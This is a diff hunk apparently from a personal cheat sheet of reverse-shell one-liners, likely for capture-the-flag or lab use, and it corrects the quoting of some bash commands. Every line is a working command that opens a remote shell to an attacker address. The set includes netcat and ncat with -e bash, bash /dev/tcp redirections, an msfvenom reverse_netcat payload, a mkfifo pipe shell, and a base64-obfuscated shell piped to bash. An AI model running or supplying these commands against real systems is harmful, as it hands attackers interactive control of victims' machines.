@@ -63,7 +63,8 @@ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lo
 nc 10.11.99.141 5555 -e bash
 ncat 10.11.99.141 5555 -e bash
 bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
-/bin/bash -c /bin/bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
+bash -c 'bash -i >& /dev/tcp/10.11.99.141/4444 0>&1'
+/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'
 msfvenom -p cmd/unix/reverse_netcat lhost=10.10.10.10 lport=8888 R
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.14.85.242 9001 >/tmp/f
 echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMS45OS4xNDEvODg4OCAwPiYx | base64 -d | bash # 10.11.99.141 8888
